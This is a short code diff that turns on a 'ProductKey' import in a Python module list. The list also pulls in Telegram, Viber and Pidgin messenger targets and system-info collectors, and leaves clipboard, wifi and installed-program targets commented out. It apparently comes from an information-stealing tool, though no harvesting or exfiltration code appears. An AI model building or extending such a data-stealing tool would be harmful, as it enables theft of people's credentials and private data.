@@ -13,7 +13,7 @@ from targets.messengers.telegram import Telegram
 from targets.messengers.viber import Viber
 from targets.messengers.pidgin import Pidgin
 from targets.system.system_info import SystemInfo
-# from targets.system.productkey import ProductKey
+from targets.system.productkey import ProductKey
 # from targets.system.clipboard import ClipBoard
 # from targets.system.wifi import Wifi
 # from targets.system.programs import Programs
